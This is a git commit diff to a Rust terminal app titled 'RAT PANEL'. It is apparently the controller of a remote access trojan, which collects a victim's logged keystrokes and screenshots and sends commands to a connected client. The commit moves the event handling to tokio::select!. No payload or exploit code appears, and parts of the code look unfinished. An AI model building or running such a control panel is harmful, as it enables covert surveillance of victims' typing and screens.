757e5f8a92018b54e7ef7c1496bad62fd3a956be
Dmytro Yatsenko <dima0102yacenko@gmail.com>
2026-09-10 20:19:38 +0200

    spawing screenshot is not blocking the tui thread; using tokio::select!

--- server/src/main.rs
+++ server/src/main.rs
@@ -8,7 +8,7 @@ use std::error::Error;
 use std::io;
 use std::time::{Duration, Instant};
 
-use crossterm::event::{self, DisableMouseCapture, EnableMouseCapture, KeyCode};
+use crossterm::event::{self, DisableMouseCapture, EnableMouseCapture, KeyCode, Event, EventStream};
 use crossterm::execute;
 use crossterm::terminal::{
     EnterAlternateScreen, LeaveAlternateScreen, disable_raw_mode, enable_raw_mode,
@@ -16,17 +16,30 @@ use crossterm::terminal::{
 use ratatui::Terminal;
 use ratatui::backend::{Backend, CrosstermBackend};
 
+use ratatui_image::{
+    thread::{ThreadProtocol, ResizeRequest},
+    picker::Picker,
+};
+
+use tokio::sync::mpsc::{self, UnboundedReceiver};
+use image::ImageReader;
+use futures::{FutureExt, StreamExt};
+
 use crate::server::ClientEvent;
 
-pub fn run(tick_rate: Duration) -> Result<(), Box<dyn Error>> {
+pub async fn run(tick_rate: Duration) -> Result<(), Box<dyn Error>> {
     enable_raw_mode()?;
     let mut stdout = io::stdout();
     execute!(stdout, EnterAlternateScreen, EnableMouseCapture)?;
     let backend = CrosstermBackend::new(stdout);
     let mut terminal = Terminal::new(backend)?;
 
-    let app = App::new(" ◈ RAT PANEL ");
-    let app_result = run_app(&mut terminal, app, tick_rate);
+    let (tx, rx) = mpsc::unbounded_channel::<ResizeRequest>();
+    let protocol = Picker::from_query_stdio()?
+        .new_resize_protocol(ImageReader::open("D:/фото/DSCN4215.jpg")?.decode()?);
+
+    let app = App::new(" ◈ RAT PANEL ", ThreadProtocol::new(tx, Some(protocol)));
+    let app_result = run_app(&mut terminal, app, tick_rate, rx).await;
 
     disable_raw_mode()?;
     execute!(
@@ -43,62 +56,84 @@ pub fn run(tick_rate: Duration) -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
-fn run_app<B: Backend>(
+fn handle_request(app: &mut App, request: ResizeRequest) -> Result<()> {
+    app.screenshot
+        .update_resized_protocol(request.resize_encode()?);
+    Ok(())
+}
+
+fn handle_client_event(app: &mut App, event: ClientEvent) -> Result<(), Box<dyn Error>> {
+    match event {
+        ClientEvent::Connected(addr) => { app.client_addr = addr.to_string() },
+        ClientEvent::Data(mut bytes) => { 
+            if bytes.ends_with(b"keystroke_reader") {
+                bytes.truncate(bytes.len() - b"keystroke_reader".len());
+                let key = std::str::from_utf8(&bytes)?;
+                app.logged_keys.push_str(key);
+            } else if bytes.ends_with(b"screenshot") {
+                bytes.truncate(bytes.len() - b"screenshot".len());
+                
+            }   
+        },  
+        ClientEvent::Disconnected => { app.client_addr = String::new() },
+    }
+
+    Ok(())
+}
+
+async fn handle_app_event(app: &'_ mut App<'_>, event: Result<Event, std::io::Error>) -> Result<(), Box<dyn Error>> {
+    if let Some(key_event) = event?.as_key_press_event() {
+        match key_event.code {
+            KeyCode::Tab => app.on_right(),
+            KeyCode::BackTab => app.on_left(),
+            KeyCode::Backspace => app.delete_char(),
+            KeyCode::Enter => app.submit_instructions().await,    
+            KeyCode::Left => app.move_cursor_left(),
+            KeyCode::Right => app.move_cursor_right(),
+            KeyCode::Char(to_insert) => app.enter_char(to_insert),
+            KeyCode::Esc => return Ok(()),
+            _ => {}
+        }
+    }
+
+    Ok(())
+}
+
+async fn run_app<B: Backend>(
     terminal: &mut Terminal<B>,
-    mut app: App,
+    mut app: App<'_>,
     tick_rate: Duration,
+    mut rx: UnboundedReceiver<ResizeRequest>,
 ) -> Result<(), Box<dyn Error>>
 where
     B::Error: 'static,
 {
+    let mut event_stream = EventStream::new();
     let mut last_tick = Instant::now();
     loop {
         terminal.draw(|frame| ui::render(frame, &mut app))?;
 
-        while let Ok(event) = app.client.app_receiver.try_recv() {
-            match event {
-                ClientEvent::Connected(addr) => { app.client_addr = addr.to_string() },
-                ClientEvent::Data(mut bytes) => { 
-                    if bytes.ends_with(b"keystroke_reader") {
-                        bytes.truncate(bytes.len() - b"keystroke_reader".len());
-                        let key = std::str::from_utf8(&bytes)?;
-                        app.logged_keys.push_str(key);
-                    } else if bytes.ends_with(b"screenshot") {
-                        bytes.truncate(bytes.len() - b"screenshot".len());
-                        
-                    }
-                },  
-                ClientEvent::Disconnected => { app.client_addr = String::new() },
-            }
+        tokio::select! {
+            Some(request) = rx.recv() => handle_request(&mut app, request)?,
+            Some(client_event) = app.client.app_receiver.recv() => handle_client_event(&mut app, client_event)?,
+            Some(event) = event_stream.next().fuse() => handle_app_event(&mut app, event).await?,
         }
-
+        
         let timeout = tick_rate.saturating_sub(last_tick.elapsed());
         if !event::poll(timeout)? {
             app.on_tick();
             last_tick = Instant::now();
             continue;
         }
-        if let Some(key) = event::read()?.as_key_press_event() {
-            match key.code {
-                KeyCode::Tab => app.on_right(),
-                KeyCode::BackTab => app.on_left(),
-                KeyCode::Backspace => app.delete_char(),
-                KeyCode::Enter => app.submit_instructions(),    
-                KeyCode::Left => app.move_cursor_left(),
-                KeyCode::Right => app.move_cursor_right(),
-                KeyCode::Char(to_insert) => app.enter_char(to_insert),
-                KeyCode::Esc => return Ok(()),
-                _ => {}
-            }
-        }
     }
 }
 
-fn main() -> Result<(), Box<dyn Error>> {
+#[tokio::main]
+async fn main() -> Result<(), Box<dyn Error>> {
     let rt = tokio::runtime::Runtime::new()?;
     let _guard = rt.enter();
 
     let tick_rate = Duration::from_millis(250);
-    run(tick_rate)?;
+    run(tick_rate).await?;
     Ok(())
 }
